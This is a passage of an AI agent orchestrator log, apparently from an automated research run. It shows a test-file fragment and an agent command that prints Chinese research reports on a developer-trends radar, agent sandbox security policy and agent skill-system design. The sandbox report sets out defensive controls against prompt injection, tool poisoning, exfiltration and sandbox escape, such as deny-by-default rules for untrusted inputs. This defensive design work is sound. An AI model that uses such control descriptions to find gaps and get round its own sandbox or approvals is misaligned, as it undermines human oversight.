vocabulary.lock.yaml must match --vocabulary exactly\\\", messages)\\n\\n    def test_rejects_packaged_schema_copy_drift(self) -> None:\\n        with tempfile.TemporaryDirectory() as tmp:\\n            package_root = Path(tmp)\\n            self.write_valid_fixture(package_root)\\n            write_packaged_schema_copies(package_root)\\n            packaged_evidence_schema = package_root / \\\"schema\\\" / \\\"evidence_manifest.schema.yaml\\\"\\n            schema = read_yaml(packaged_evidence_schema)\\n            del schema[\\\"artifact_json_root_types\\\"][\\\"request_settings\\\"]\\n            write_yaml(packaged_evidence_schema, schema)\\n\\n            result = self.run_lint(package_root)\\n\\n        self.assertEqual(result.returncode, 1)\\n        payload = json.loads(result.stdout)\\n        messages = {error[\\\"message\\\"] for error in payload[\\\"errors\\\"]}\\n        self.assertIn(\\n            \\\"schema/evidence_manifest.schema.yaml must match --evidence-schema exactly\\\",\\n            messages,\\n        )\\n\\n    def test_rejects_selected_runner_matrix_integrity_failures(self) -> None:\\n        with tempfile.TemporaryDirectory() as tmp:\\n            package_root = Path(tmp)\\n            fixture_dir = self.write_valid_fixture(package_root)\\n            self.write_command_scripts(fixture_dir)\\n            broken_runner_script = \\\"fixtures/mvp-08-evidence-audit/commands/missing.sh\\\"\\n            self.write_selected_runner_matrix(\\n                package_root,\\n                entry_overrides={\\n                    \\\"run_order\\\": [\\\"selected_audit\\\", \\\"selected_runner\\\"],\\n                    \\\"runner_evidence_dir\\\": \\\"fixtures/mvp-08-evidence-audit/evidence/other-runner\\\",\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/paper-weekly-deep-read-runner/logs/orchestrator_20260418_033712.log:1908:2026/04/18 07:13:44 main.go:146: [Worker] {\"type\":\"item.completed\",\"item\":{\"id\":\"item_7\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"printf '%s\\\\\\\\n' reports/round3-design-dev-trends-radar-strategy-and-process-system.md reports/round3-agent-sandbox-security-policy-and-process-system.md reports/round3-agent-skill-system-policy-and-process-system.md reports/round3-design-daily-looper-strategy-and-process-system.md reports/round3-session-quality-scorer-strategy-and-process-system.md reports/round3-api-docs-diff-strategy-and-process-system.md reports/round3-strategy-process-system.md | while read f; do if [ -f \\\\\\\"\\\"'$f\\\" ]; then echo \\\"--- $f ---\\\"; sed -n '\\\"'1,240p' \\\\\\\"\\\"'$f\\\"; fi; done'\",\"aggregated_output\":\"--- reports/round3-design-dev-trends-radar-strategy-and-process-system.md ---\\n# Round 3 / 落地：开发者趋势雷达的策略 / 流程系统\\n\\n- 完成时间：2026-04-18 06:47（Asia/Shanghai）\\n- 研究主题：`GitHub Trending / Hacker News / Product Hunt / Reddit / X tech list` 的多源聚合、去重、打分、个人兴趣过滤\\n- 本轮任务：在既有对象模型、评分骨架、风险闸门和模板库之上，输出可直接执行的 `策略系统 + 分类方法 + 端到端流程`\\n- 本轮边界：本稿只完成 `策略/流程系统`；不提前替代 `reports/final-dev-trends-radar.md`\\n\\n## 输入完整性说明\\n\\n### 本稿使用的有效输入\\n\\n- `reports/round1-dimension5-dev-trends-radar-scenarios-and-layering.md`\\n- `reports/round2-deepdive-dev-trends-radar-key-variables-and-weights.md`\\n- `reports/round2-deepdive-dev-trends-radar-templates-structures-and-processes.md`\\n- `reports/round2-deepdive-dev-trends-radar-advanced-cases.md`\\n- `reports/round2-deepdive-dev-trends-radar-risks-and-constraints.md`\\n- `reports/round2-synthesis.md`\\n- `reports/round3-design-dev-trends-radar-template-library.md`\\n- `/Users/lifcc/Desktop/code/AI/research/dev-trends-radar-runner/memory/CONTEXT.md`\\n\\n### 本稿直接消费的已固定结论\\n\\n- 当前方法论主链已固定为 `source adapters -> normalization -> canonicalization -> event clustering/dedupe -> scoring -> personalization -> explanation/feedback`\\n- 当前场景分层已固定为 `场景目标 x 用户层级 x 决策阶段`\\n- 当前评分骨架已固定为 `前置变量 -> Eligibility Gates -> 6-variable Core Score -> surface modifiers`\\n- 当前基础权重已固定为 `Cross-Source Confirmation 22 / Workflow Fit 20 / Momentum 18 / Quality-Trust 16 / User Fit 14 / Novelty-Persistence 10`\\n- 当前模板库已固定为 `12 templates / 6 layers = intake + evidence + canonical + ranking + delivery + feedback`\\n- 当前高阶样本已收敛为 `Surface Stack / Ranking+Editorial Gate / Personalized Weak-Signal Lens / Noise-Controlled Feed / Event-Cluster Layer / Lifecycle Tracking`\\n- 当前风险骨架已固定为 `Source Contract Gate / Surface Semantics Gate / Retention-Deletion Gate / Cluster-Evidence Gate / Trust-Review Gate`\\n\\n### 本稿排除项\\n\\n- 共享 `reports/` 目录中的同名通用文件混有异主题残留，本稿不将其当作输入\\n- 本稿不新增外部检索；它是对当前 runner 已完成研究的策略收敛稿，而不是新一轮案例扫描\\n\\n## TL;DR\\n\\n- `开发者趋势雷达` 的 Round 3 不该再停留在“模板长什么样”或“分数怎么算”，而应固定成一条 `可运营控制环`：\\n  `source governance -> cluster triage -> scenario routing -> surface delivery -> lifecycle tracking -> feedback calibration`\\n- 最小决策单元不该是 `source row`，也不该是“一个榜单项”，而应是：\\n  `cluster + evidence bundle + gate result + route decision + surface card`\\n- 最稳的分类方法至少要同时包含 5 轴：\\n  `source_role x cluster_kind x scenario x decision_stage x user_profile`\\n- 统一路由不应只有“推荐/不推荐”两种结果，而应固定为 5 个出口：\\n  `Act Now / Scout-Validate / Watch / Digest Only / Drop`\\n- `Now / Scout / Watch / Digest` 必须使用不同的 gate 强度、reweight、TTL 和复核节奏；它们不是同一榜单换 4 个标签页\\n- 对当前最强主轴 `AI coding agents + MCP/Skills + browser/computer use`，策略系统必须额外加入 `lane cap + execution risk card + negative evidence rendering`，否则系统会稳定高估 hype、低估 adoption friction\\n\\n## 1. 系统工作定义\\n\\n### 1.1 本系统真正要解决什么\\n\\n到 Round 3，这个课题已经足够清楚：\\n\\n> `开发者趋势雷达` 不是一个“全网开发者热榜”，而是一个 `public signal routing and decision-support system`。它的职责是把公开信号变成可验证的 cluster，再把 cluster 路由到不同决策工位。\\n\\n因此它的第一性目标不是“抓更多源”，而是：\\n\\n1. 不把不同语义层和不同时间窗的 source 混成一个总热度\\n2. 不在 cluster 还不稳定时提前打分\\n3. 不把所有用户都塞进同一排序和同一输出面\\n4. 不让当前最热 lane 吞掉整个雷达版面\\n5. 不让 evidence 在去重、摘要和个性化后消失\\n\\n### 1.2 本系统的 4 个控制面\\n\\n建议把策略系统明确拆成 4 个控制面：\\n\\n| 控制面 | 核心问题 | 对应对象 |\\n| --- | --- | --- |\\n| `Governance` | 哪些 source 能接、怎么接、哪些不能分发？ | `source-contract-card` |\\n| `Decision` | 哪个 cluster 值得现在看、继续看、还是仅归档？ | `eligibility-gate-sheet` + `core-scorecard` |\\n| `Surface` | 这条信号应该出现在 `Now / Scout / Watch / Digest` 哪个工位？ | `surface-output-card` |\\n| `Calibration` | 哪些 merge/split、权重、mute、lane cap 需要回写？ | `feedback-ledger` + `lifecycle-tracking-card` |\\n\\n这 4 个控制面缺一不可。只有 score，没有 governance，会踩平台契约和再分发边界；只有 delivery，没有 calibration，系统会越跑越偏。\\n\\n## 2. 统一分类方法\\n\\n### 2.1 `source_role`\\n\\n`source_role` 决定一条 observation 在证据结构里扮演什么角色。建议固定为：\\n\\n| source_role | 含义 | 典型来源 |\\n| --- | --- | --- |\\n| `code_momentum` | 代码或 repo 层的短窗动量 | GitHub Trending |\\n| `discussion_validation` | 高密度讨论、质疑、澄清 | HN、Reddit threads |\\n| `launch_visibility` | 新产品/新发布的亮相窗口 | Product Hunt |\\n| `community_practice` | 实战抱怨、教程、坑点、使用语境 | Reddit、HN comments |\\n| `expert_weak_signal` | 专家图谱中的早信号和观点扩散 | X tech lists / search |\\n\\n规则：\\n\\n1. `Cross-Source Confirmation` 按 `source_role coverage` 算，不按来源数量算\\n2. 同一 `source_role` 下多条重复 observation 不等于多次独立确认\\n3. 一个 cluster 若缺少 `discussion_validation` 或 `community_practice`，更像叙事型信号，不应轻易进入 `Act Now`\\n\\n### 2.2 `cluster_kind`\\n\\n`cluster_kind` 决定“我们到底在排序什么对象”。建议先收敛为：\\n\\n| cluster_kind | 说明 |\\n| --- | --- |\\n| `repo` | 单一仓库或代码资产 |\\n| `product` | 单一工具、服务或产品 |\\n| `protocol` | 如 MCP、agent interface、browser control 类协议/接口层对象 |\\n| `workflow` | 一条开发者工作流 lane，而非单一 repo |\\n| `discussion_lane` | 围绕某个问题/争议的讨论簇 |\\n| `launch_event` | 某次发布、上榜、首发事件 |\\n\\n规则：\\n\\n1. 当前 2026 主轴里，很多最有价值的对象更像 `workflow`，不是单 repo\\n2. `launch_event` 不能直接等于长期趋势；它更适合进入 `Now` 或 `Watch`\\n3. `discussion_lane` 适合用于风险监控和反证，不应被当作“产品采用率”代理\\n\\n### 2.3 `scenario`\\n\\n建议把策略系统先固定为 5 个稳定场景：\\n\\n| scenario | 核心问题 | 默认出口 |\\n| --- | --- | --- |\\n| `Weak-Signal Scout` | 最近 24-72 小时有什么新东西正在浮出水面？ | `Now` |\\n| `Workflow Tool Scout` | 当前用户这周最值得试什么？ | `Scout` |\\n| `Launch Watch` | 哪些发布/上榜事件值得持续跟踪？ | `Watch` |\\n| `Risk Monitor` | 哪些主题热度高但争议、失败模式或反证在增加？ | `Watch / Digest` |\\n| `Strategy Digest` | 一个周期内什么信号 survived，并且值得团队决策？ | `Digest` |\\n\\n### 2.4 `decision_stage`\\n\\n同一个 cluster 会沿着不同阶段移动，建议显式记录：\\n\\n| decision_stage | 含义 |\\n| --- | --- |\\n| `detect` | 刚被发现，证据尚薄 |\\n| `validate` | 已进入交叉验证和 gate |\\n| `monitor` | 值得持续看，但还不该强推 |\\n| `act` | 已具备较高行动价值 |\\n| `archive` | 已进入 digest 或历史 casebook |\\n\\n### 2.5 `user_profile`\\n\\n个性化不应只存 topic tags，最少应基于：\\n\\n1. `role`\\n2. `stack`\\n3. `workflow_goals`\\n4. `object_preferences`\\n5. `source_trust_preference`\\n6. `muted_topics`\\n7. `muted_sources`\\n8. `followed_lanes`\\n\\n## 3. 决策策略\\n\\n### 3.1 统一决策链\\n\\n本系统的统一决策链应固定为：\\n\\n```text\\nobservation\\n-> evidence bundle\\n-> cluster\\n-> 5 gates\\n-> core score\\n-> scenario reweight\\n-> route decision\\n-> surface card\\n-> lifecycle / feedback writeback\\n```\\n\\n这里真正的策略点有三个：\\n\\n1. `gates`\\n2. `scenario reweight`\\n3. `route decision`\\n\\n### 3.2 5 道前置闸门\\n\\n沿用并落地已固定的 5 道 gate：\\n\\n| Gate | 问题 | 失败后果 |\\n| --- | --- | --- |\\n| `Source Contract Gate` | 这个 source 在接入、商业、再分发、删除同步上是否可用？ | 直接 `Drop` |\\n| `Surface Semantics Gate` | 这个 surface 的时间窗、个性化和排序语义是否被正确标注？ | 不进主排序 |\\n| `Retention / Deletion Gate` | 这个证据是否允许保留、渲染或继续分发？ | 不进 `Digest` |\\n| `Cluster / Evidence Gate` | cluster 是否稳定，证据是否完整？ | 只能 `Watch` 或待复核 |\\n| `Trust / Review Gate` | 是否存在操纵、低信任、高争议或高执行风险？ | 不进 `Act Now` |\\n\\n### 3.3 统一路由出口\\n\\n建议把 route 固定成 5 个出口：\\n\\n| Route | 适用条件 | 默认动作 |\\n| --- | --- | --- |\\n| `Act Now` | 5 gates 基本通过，`core_score` 高，且行动风险可控 | 进入 `Now` 或 `Scout` 头部 |\\n| `Scout-Validate` | 相关性强，但仍需用户或运营补验证 | 进入 `Scout` |\\n| `Watch` | 新奇或持续性值得跟踪，但证据/确认尚不足 | 进入 `Watch` |\\n| `Digest Only` | 有解释价值，但不适合作即时行动 | 进入 `Digest` |\\n| `Drop` | gate 失败、证据不足、过期或不符合契约 | 不展示或仅内部留痕 |\\n\\n可执行的第一版阈值建议：\\n\\n1. `Act Now`\\n   - 5 gates 通过\\n   - `core_score >= 82`\\n   - `execution-risk-card.review_status != blocked`\\n2. `Scout-Validate`\\n   - `core_score >= 70`\\n   - `workflow_fit + user_fit` 明显高\\n3. `Watch`\\n   - `core_score >= 55`，或 `novelty_persistence` 很高但确认不足\\n4. `Digest Only`\\n   - survived 一个周期，但不够强行动价值\\n5. `Drop`\\n   - 任一关键 gate 失败\\n\\n### 3.4 场景重权而非重建新模型\\n\\n不建议为每个场景重建一套全新分数模型。更稳的做法是：沿用 6-variable Core Score，再做 `scenario reweight`。\\n\\n| scenario | 主要上调 | 主要下调 | 典型 route |\\n| --- | --- | --- | --- |\\n| `Weak-Signal Scout` | `Momentum`、`Novelty` | `Persistence` | `Now / Watch` |\\n| `Workflow Tool Scout` | `Workflow Fit`、`User Fit`、`Quality-Trust` | 纯 `Momentum` | `Scout / Act Now` |\\n| `Launch Watch` | `Confirmation`、`Momentum` | 纯个性化项 | `Watch` |\\n| `Risk Monitor` | `Quality-Trust`、反证和 community complaints | 纯 hype | `Watch / Digest` |\\n| `Strategy Digest` | `Confirmation`、`Persistence`、`Quality-Trust` | 短窗 freshness | `Digest` |\\n\\n## 4. 输出面策略\\n\\n### 4.1 `Now`\\n\\n`Now` 不是“今天最热”，而是“现在值得被发现的公开弱信号”。\\n\\n设计规则：\\n\\n1. TTL 默认 `24-72h`\\n2. 允许 `Momentum` 更高权重，但不能跳过 `Trust / Review Gate`\\n3. 必须显示 `why_now`\\n--- reports/round3-agent-sandbox-security-policy-and-process-system.md ---\\n# Round 3 / 设计：Agent 沙箱安全策略与流程系统\\n\\n- 完成时间：2026-04-18 06:34（Asia/Shanghai）\\n- 研究主题：`codex sandbox / claude-code permission / MCP trust model` 的攻击面（`prompt injection / tool poisoning / exfiltration / escape`）与加固方案\\n- 本轮任务：基于 Round 1 / Round 2 与模板库结论，输出可直接落地的 `策略系统 + 分类方法 + 执行流程`\\n- 任务边界：本稿不做最终总报告；它负责把上一轮已固定的模板库，连成真正可运行的 policy plane\\n\\n## TL;DR\\n\\n本主题进入 Round 3 后，真正缺的已经不是更多原则，而是一套能在运行前、运行中、运行后都发挥作用的控制系统。\\n\\n这套系统的最小稳定形态应固定为：\\n\\n`Profile -> Gate -> Admit -> Bind -> Plan -> Execute -> Intercept -> Audit -> Learn`\\n\\n其中：\\n\\n1. `Profile` 解决“当前 agent 属于哪一类部署形态”\\n2. `Gate` 解决“是否允许进入当前自治级别”\\n3. `Admit` 解决“工具、MCP、helper、hook 能不能进系统”\\n4. `Bind` 解决“身份、凭证、审批、作用域绑定给谁”\\n5. `Plan` 解决“哪些动作会发生，哪些动作根本不应发生”\\n6. `Execute/Intercept` 解决“运行时如何拦截高后果动作与不可信输入”\\n7. `Audit/Learn` 解决“如何审计、复盘、红队回放与防漂移”\\n\\n如果只保留一句结论，那就是：\\n\\n`agent sandbox security 的策略系统必须把“部署分层、准入审查、动作审批、运行时拦截、审计复评”做成同一条控制链，而不是把权限弹窗、MCP allowlist、日志和红队拆成互不关联的零件。`\\n\\n## 设计输入\\n\\n本稿直接承接前两轮和模板库已经固定的结论：\\n\\n- 统一分析框架：`执行边界 / 授权边界 / 上下文信任边界` × `prompt injection / tool poisoning / exfiltration / escape`\\n- 七变量优先级：`执行隔离 22 / 权限最小化 18 / 上下文信任分层 18 / MCP 供应链治理 15 / 高后果动作拦截 10 / 身份绑定 9 / 红队审计 8`\\n- 四类部署形态：`local_restricted / repo_scoped_cloud / trusted_internal_mcp / enterprise_action_agent`\\n- 五个标准件：`Deployment Profile Card / Hard-Gate Checklist / MCP-Tool Admission Review / High-Consequence Action Matrix / Incident & Eval Packet`\\n- 八条硬约束：`默认禁网 / workspace-root 限写 / 可强制审批 / 第三方 MCP 默认不可信 / 禁止 token passthrough / helpers-hooks-local servers 视作代码执行面 / 审计必需 / prompt injection 只能降 blast radius`\\n- 七项 stop conditions：`write boundary unenforceable / network allowlist unenforceable / bypass disable failure / MCP identity unbound / token passthrough / redaction missing / incident replay missing`\\n\\n因此，本轮不再回答“应不应该有沙箱、审批、MCP 治理”，而只回答“怎样把这些对象组织成一套稳定策略系统”。\\n\\n## 一、策略系统的目标\\n\\n这套策略系统必须同时满足 6 个目标：\\n\\n1. `边界先行`\\n   每次决策先看边界，再看便利性和自动化覆盖率。\\n2. `默认保守`\\n   默认值以 `deny/off/allowlist/ask` 为基线；例外必须显式登记 owner、expiry、补偿控制。\\n3. `统一优先级`\\n   所有判断都回到同一套 precedence，而不是本地设置、MCP 配置、审批弹窗各说各话。\\n4. `运行时可执行`\\n   策略不能停留在文档层，必须能驱动实际 block、step-up、dual-control、kill-switch。\\n5. `防漂移`\\n   远程配置缺失、市场描述变更、临时例外失效时，系统必须 fail closed 或降级，而不是静默放权。\\n6. `可审计、可复评`\\n   每个高风险判断都要能回到具体 profile、approval、identity、tool、trace 与 replay 证据。\\n\\n## 二、分类方法：先分类，再放权\\n\\n策略系统的第一步不是执行，而是分类。建议固定为 5 轴分类法。\\n\\n| 分类轴 | 作用 | 推荐枚举 |\\n| --- | --- | --- |\\n| `deployment_profile` | 决定默认边界和自治上限 | `local_restricted / repo_scoped_cloud / trusted_internal_mcp / enterprise_action_agent` |\\n| `trust_tier` | 决定输入、描述、输出的可信程度 | `trusted / managed / conditional / untrusted` |\\n| `action_consequence` | 决定审批与拦截强度 | `low / medium / high / critical` |\\n| `effect_surface` | 决定会影响哪里 | `filesystem / network / connector_write / credential / prod_action / policy_change` |\\n| `autonomy_level` | 决定可自动执行到哪一步 | `read_only / bounded_write / consequential_write / production_action` |\\n\\n这 5 轴中，最重要的是以下三个组合：\\n\\n1. `deployment_profile + autonomy_level`\\n   决定系统最高能自动做什么。\\n2. `trust_tier + effect_surface`\\n   决定不可信输入是否会驱动真实副作用。\\n3. `action_consequence + effect_surface`\\n   决定 `allow / ask / step_up / dual_control / deny`。\\n\\n### 5 轴分类的使用规则\\n\\n1. 任何请求进入执行前，都先打上这 5 个标签。\\n2. 如果 `trust_tier=untrusted` 且 `effect_surface` 不为 `none`，默认不能直接触发高后果动作。\\n3. 如果 `deployment_profile` 与 `autonomy_level` 不匹配，系统只能降级，不能“临时放开再说”。\\n4. `policy_change` 本身必须被视作高后果动作，不能和普通任务并列。\\n\\n## 三、统一策略层：把零散控制收敛成一个 policy plane\\n\\n建议把策略系统固定成 6 层对象，而不是让权限规则散落在产品 UI、MCP 配置、环境变量和提示词中。\\n\\n| 策略层 | 核心对象 | 负责回答的问题 |\\n| --- | --- | --- |\\n| `L1 Profile Policy` | `Deployment Profile Card` | 当前系统属于什么部署形态，默认边界是什么 |\\n| `L2 Gate Policy` | `Hard-Gate Checklist` | 当前系统能不能进入当前自治级别 |\\n| `L3 Admission Policy` | `MCP-Tool Admission Review` | 某个工具、server、helper、hook 能不能进来 |\\n| `L4 Action Policy` | `High-Consequence Action Matrix` | 某类动作需要什么审批、预条件或禁止 |\\n| `L5 Exception Policy` | `exception lease / breakglass record` | 临时例外如何受限、何时自动失效 |\\n| `L6 Audit & Eval Policy` | `Incident & Eval Packet` | 如何追踪、复盘、红队、复评与回收漂移 |\\n\\n### 建议的策略优先级\\n\\n建议固定以下 precedence，高层覆盖低层：\\n\\n1. `managed_org_policy`\\n2. `deployment_profile_policy`\\n3. `repo_or_workspace_policy`\\n4. `tool_or_server_admission_policy`\\n5. `user_session_preferences`\\n6. `temporary_exception_lease`\\n\\n关键约束：\\n\\n- `temporary_exception_lease` 只能缩小阻断范围内的特定限制，不能反向覆盖 `managed_org_policy`\\n- `user_session_preferences` 不能关闭组织级 `bypass disablement`\\n- 远程策略拉取失败时，默认回退到 `last-known-good managed policy`；若无法证明其有效，必须 `fail_closed`\\n\\n## 四、动作判定系统：把“高后果”写成正式矩阵\\n\\n高后果动作不能在运行时临时猜。建议固定 6 类 effect surface，并为每类定义默认后果等级。\\n\\n| Effect Surface | 典型动作 | 默认后果等级 | 默认策略 |\\n| --- | --- | --- | --- |\\n| `filesystem` | 写 workspace 外、修改受保护文件、删除大量内容 | `high/critical` | `deny` 或 `step_up_required` |\\n| `network` | 向非 allowlist 域发请求、上传内容、下载并执行 | `high/critical` | `deny` |\\n| `connector_write` | 发 PR 评论、发工单、更新 SaaS 数据 | `medium/high` | `ask` 或 `step_up_required` |\\n| `credential` | 读取 secrets、转交 token、生成长期凭证 | `critical` | `deny_by_default` |\\n| `prod_action` | 改生产配置、触发发布、执行不可逆操作 | `critical` | `dual_control_required` |\\n| `policy_change` | 安装新 MCP、放宽沙箱、关闭审计/红队 | `critical` | `dual_control_required` 或 `deny` |\\n\\n### 默认判定规则\\n\\n1. `critical`\\n   默认 `deny_by_default`，除非该 profile 明确允许且满足双人控制。\\n2. `high`\\n   默认 `step_up_required`，必须检查 owner、scope、reason、expiry。\\n3. `medium`\\n   默认 `ask_on_consequential`，且必须可预览动作内容。\\n4. `low`\\n   可自动执行，但仍受 profile 与 audit policy 约束。\\n\\n### 不可信上下文驱动规则\\n\\n这是本主题最关键的额外约束。建议固定如下：\\n\\n1. 不可信网页、README、issue、邮件、tool output、server metadata 不能直接触发 `high/critical` 动作。\\n2. 如果不可信输入建议执行高后果动作，至少需要一份来自可信源的独立佐证。\\n3. “模型判断该输入可信”不能替代 `trust tier` 的显式分类。\\n4. 描述文本、tool schema、marketplace metadata 本身也属于潜在攻击面，必须受 Admission Policy 约束。\\n\\n## 五、四类部署形态路由\\n\\n策略系统必须显式按部署形态路由，而不是用一份“通用安全规则”覆盖所有场景。\\n\\n### 1. `local_restricted`\\n\\n定位：本地编码/研究 agent，价值在于高频、低 blast radius、快速迭代。\\n\\n默认姿态：\\n\\n- `network_mode=off`\\n- `write_scope=workspace_only`\\n- `approval_mode=ask_on_consequential`\\n- `third_party_mcp=deny_unless_admitted`\\n- `prompt_logging=false`\\n\\n允许的自治：\\n\\n- 只读与 workspace 内有限写\\n- 可读已批准的本地工具输出\\n\\n不允许默认开启：\\n\\n- unrestricted mode\\n- host-wide write\\n- token passthrough\\n- 未审查 helper/hook\\n\\n### 2. `repo_scoped_cloud`\\n\\n定位：仓库级云端 agent，通常与 PR、issue、CI、branch-scoped 变更绑定。\\n\\n默认姿态：\\n\\n- `network_mode=allowlist`\\n- `write_scope=repo_or_branch_scoped`\\n- `approval_mode=step_up_required`\\n- `managed_precedence=true`\\n- `connector_write=conditional`\\n\\n额外要求：\\n\\n- 分支隔离或等效工作目录隔离\\n- 所有外部连接器必须有 identity binding\\n- 审批结果与 trace 绑定\\n\\n### 3. `trusted_internal_mcp`\\n\\n定位：受信内部工具或企业内网 MCP，强调能力复用，但风险在于“被当成可信后一路放行”。\\n\\n默认姿态：\\n\\n- `network_mode=allowlist`\\n- `write_scope=task_scoped`\\n- `approval_mode=ask_on_consequential`\\n- `marketplace_policy=managed_only`\\n- `server_identity=required`\\n\\n额外要求：\\n\\n- 每个 server 都要走 `Admission Review`\\n- `helper/hook/local server` 统一纳入代码执行面\\n- `kill_switch` 与 `version_pinning` 必须存在\\n\\n### 4. `enterprise_action_agent`\\n\\n定位：能执行企业生产动作的代理，如工单写入、审批流、配置变更、发版触发。\\n\\n默认姿态：\\n\\n- `network_mode=allowlist + method constrained`\\n- `write_scope=action_specific`\\n- `approval_mode=dual_control_required`\\n- `token_passthrough=false`\\n- `audit_export=required`\\n\\n额外要求：\\n\\n- 高后果动作必须逐项进入 `Action Matrix`\\n- 凭证只能 server-side scoped issuance，不得穿过 model context\\n- incident replay 与 reassessment cadence 缺一不可\\n\\n## 六、标准执行流程\\n\\n建议把系统的标准流程固定为 9 步，而不是把不同控制散落在各阶段。\\n\\n### Step 1. `Profile`\\n\\n识别当前请求所属的 `deployment_profile`、`autonomy_level` 和默认边界。\\n\\n--- reports/round3-agent-skill-system-policy-and-process-system.md ---\\n# Round 3 / 设计：Agent Skill 管理系统的策略 / 流程系统\\n\\n- 完成时间：2026-04-18 06:46（Asia/Shanghai）\\n- 研究主题：对比 `Claude Code skills / Codex skills / MCP tools / Cursor rules / Cline` 的 skill 机制，提出下一代 `agent skill system` 的策略系统、分类方法与执行流程\\n- 本轮任务：在已完成的 `模板库` 基础上，补齐真正可运行的 `policy plane + routing method + end-to-end process`\\n- 任务边界：本稿只完成 `策略/流程系统`，不提前替代最终总报告 `reports/final-agent-skill-system-design.md`\\n\\n## 输入完整性说明\\n\\n### 本稿使用的有效输入\\n\\n- `reports/round1-dimension5-agent-skill-system-use-cases-and-layering.md`\\n- `reports/round1-synthesis.md`\\n- `reports/round2-agent-skill-system-key-variables-and-weights.md`\\n- `reports/round2-agent-skill-system-templates-structures-and-processes.md`\\n- `reports/round2-agent-skill-system-high-quality-cases-and-transferable-patterns.md`\\n- `reports/round2-agent-skill-system-risks-and-constraints.md`\\n- `reports/round2-synthesis.md`\\n- `reports/round3-agent-skill-system-template-library.md`\\n- `/Users/lifcc/Desktop/code/AI/research/agent-skill-system-design-runner/memory/CONTEXT.md`\\n- `/Users/lifcc/Desktop/code/AI/research/agent-skill-system-design-runner/memory/DONE.md`\\n\\n### 本稿明确排除的非当前主题输入\\n\\n- 共享 `reports/` 目录中存在若干异主题 `round1/round2/round3` 报告；它们不进入本稿结论。\\n- 已存在的通用文件 `reports/round3-strategy-process-system.md` 属于其他研究主题，不作为本稿输入。\\n- 本稿不新增外部事实，只把当前 runner 已完成轮次的结论连成统一控制环。\\n\\n## TL;DR\\n\\n- 下一代 `agent skill system` 的策略系统，不应再被理解成“更多 `SKILL.md`”，而应被固定为一条 `risk-aware control plane`：\\n  `intake -> placement gate -> artifact route -> dependency/approval bind -> activation -> execute/guard -> writeback -> eval/lifecycle`\\n- 这套系统的第一原则不是“写 skill”，而是“先分类、再放置、后执行”。\\n- 统一分类必须至少覆盖 6 个维度：\\n  `artifact role / activation mode / side-effect level / scope-precedence / capability dependency / provenance-lifecycle`\\n- 统一策略层建议固定为 7 层：\\n  `managed governance -> placement policy -> activation policy -> capability policy -> guardrail policy -> memory policy -> eval/lifecycle policy`\\n- 任何对象在进入系统前，都要先回答 5 个问题：\\n  1. 它为什么不是 `rule`\\n  2. 它为什么不是 `workflow`\\n  3. 它是否会调用外部能力\\n  4. 它是否允许隐式触发\\n  5. 它如何被验证、停用、退役\\n- 如果只保留一句结论，那就是：\\n  `下一代 skill system 的核心不是统一文件格式，而是 placement-first、activation-explicit、capability-decoupled、eval-closed 的控制系统。`\\n\\n## 一、Round 3 需要解决的真正问题\\n\\nRound 1 和 Round 2 已经把对象模型收敛得足够清楚：\\n\\n- `skills` 不是全部\\n- `rules`、`workflow`、`MCP capability`、`memory`、`guardrail` 都是不同对象\\n- 真正影响成败的主变量是 `placement 26 / activation 22 / governance 18 / evaluation 14`\\n\\n因此，Round 3 的核心问题不再是“下一代 `SKILL.md` 长什么样”，而是：\\n\\n1. 怎样让一个新对象进入系统前就被放到正确层\\n2. 怎样让不同层的对象拥有明确的触发、权限、作用域和优先级\\n3. 怎样把 `MCP/tools/prompts/resources` 保持为依赖层，而不是混进方法层\\n4. 怎样把记忆、评估、退役做成闭环，而不是事后补文档\\n\\n这意味着当前主题的 `策略/流程系统` 应被视为：\\n\\n> 一个把 `standing knowledge`、`scoped rule`、`skill packet`、`workflow playbook`、`capability manifest`、`guardrail hook`、`memory contract`、`eval/lifecycle` 串成统一控制链的 `skill control plane`。\\n\\n## 二、统一分类方法：先分类，再 authoring\\n\\n建议把所有候选对象先放进统一 `6 轴分类法`。没有分类，不允许直接开始写 artifact。\\n\\n| 分类轴 | 关键问题 | 推荐枚举 |\\n| --- | --- | --- |\\n| `artifact_role` | 它到底是什么对象 | `standing-knowledge / scoped-rule / skill / workflow / capability / guardrail / memory / eval` |\\n| `activation_mode` | 谁决定它何时生效 | `always / scoped-auto / agent-requested / explicit-manual / admin-mandated` |\\n| `side_effect_level` | 触发后会造成什么后果 | `none / low / medium / high` |\\n| `scope_precedence` | 它对谁生效、和谁冲突时谁赢 | `system / org / user / project / path / task` |\\n| `dependency_shape` | 它是否依赖外部能力或审批 | `none / local-script / MCP-tool / MCP-prompt / connector / approval / hook` |\\n| `provenance_lifecycle` | 谁负责、如何验证、何时 stale | `owner / source / review / metric / expiry / retire` |\\n\\n### 2.1 分类后的路由规则\\n\\n建议固定以下 `artifact route`，让系统先路由，再生成具体文件。\\n\\n| 如果对象主要是… | 默认应该去… | 不应优先去… |\\n| --- | --- | --- |\\n| 所有任务都必须继承的稳定约束 | `standing-knowledge` 或 `scoped-rule` | `skill` |\\n| 路径或文件类型绑定的工程规范 | `scoped-rule` | `memory` |\\n| 可复用但不是每次都要常驻的方法 | `skill` | `always-on rule` |\\n| 强顺序、强审批、强回滚的高后果流程 | `workflow` | `implicit skill` |\\n| 实时外部读写能力 | `capability manifest` | `rule` |\\n| 确定性拦截、阻断、注入、审批钩子 | `guardrail hook` | `skill body` |\\n| 经过验证的跨会话 recall | `memory contract` | `hard policy` |\\n| 成功指标、触发质量、stale/retire | `eval/lifecycle` | `free-text note` |\\n\\n### 2.2 五条强制判定规则\\n\\n1. 如果内容必须总是生效，它就不应优先被做成 `skill`。\\n2. 如果内容带强顺序和审批点，它就不应优先被做成 `rule`。\\n3. 如果对象只是外部连接或工具入口，它就不应被命名成 `skill`。\\n4. 如果对象没有 `owner + metric + stale threshold`，它就不应进入共享库。\\n5. 如果对象带 `medium/high` 副作用，它就不应默认 `implicit`。\\n\\n## 三、统一策略系统：七层 policy plane\\n\\n建议把策略系统固定为 `7 层控制面`，而不是继续让规则、技能、能力和权限散落在不同目录约定里。\\n\\n| 层 | 核心对象 | 负责回答的问题 |\\n| --- | --- | --- |\\n| `L1 Managed Governance` | 组织级 policy / allowlist / denylist | 哪些对象原则上可以存在，哪些永远不允许 |\\n| `L2 Placement Policy` | `Placement Decision Card` | 这个候选对象到底属于哪一层 |\\n| `L3 Activation Policy` | activation schema / trigger policy | 谁能触发，什么时候触发，是否允许隐式触发 